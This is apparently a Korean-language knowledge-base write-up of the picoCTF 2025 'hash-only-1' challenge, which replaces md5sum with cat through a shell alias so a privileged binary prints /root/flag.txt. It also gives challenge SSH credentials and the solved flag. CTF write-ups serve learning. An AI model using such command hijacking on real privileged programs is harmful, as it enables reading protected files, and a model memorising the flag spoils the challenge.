---
title: hash-only-1 — picoCTF 2025 binary exploitation writeup
created: 2026-06-23
updated: 2026-06-23
type: query
tags: [ctf, picoctf, pwn, binary-exploitation, path-hijack, system-abuse]
sources: [https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/hash-only-1.md]
confidence: high
---

# hash-only-1 — picoCTF 2025 binary exploitation writeup

> 전형적인 메모리 취약점이 아닌 **PATH/environment hijacking** 문제입니다. `flaghasher` 바이너리는 내부적으로 `md5sum /root/flag.txt`를 실행하는데, `md5sum`을 `cat`으로 치환하면 flag 내용을 직접 읽을 수 있습니다.

## 접속 정보
```
ssh ctf-player@shape-facility.picoctf.net -p 60729
password: 3f39b042
```

## 1. 분석
`strings flaghasher`로 확인해보면 내부에서 `/bin/bash -c md5sum /root/flag.txt`를 실행합니다.
`md5sum`은 단방향 해시 함수이므로 해시값만으로 원본을 복원할 수 없습니다.

## 2. 공격 흐름

### Step 1: alias hijacking
```bash
alias md5sum='/bin/cat'
```

### Step 2: flaghasher 실행
```bash
./flaghasher
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_e8792110}
```

## Flag
`picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_e8792110}`

## 3. 핵심 패턴
1. 바이너리 내부에서 외부 명령어(`md5sum`)를 실행하는 구조
2. **alias**로 명령어를 치환해 원하는 동작으로 변경
3. Non-interactive shell에서도 alias가 동작하는 환경이어야 함

## 4. 연결 개념
- [[path-hijacking-system-abuse-ctf-patterns]]
- [[exploitation]]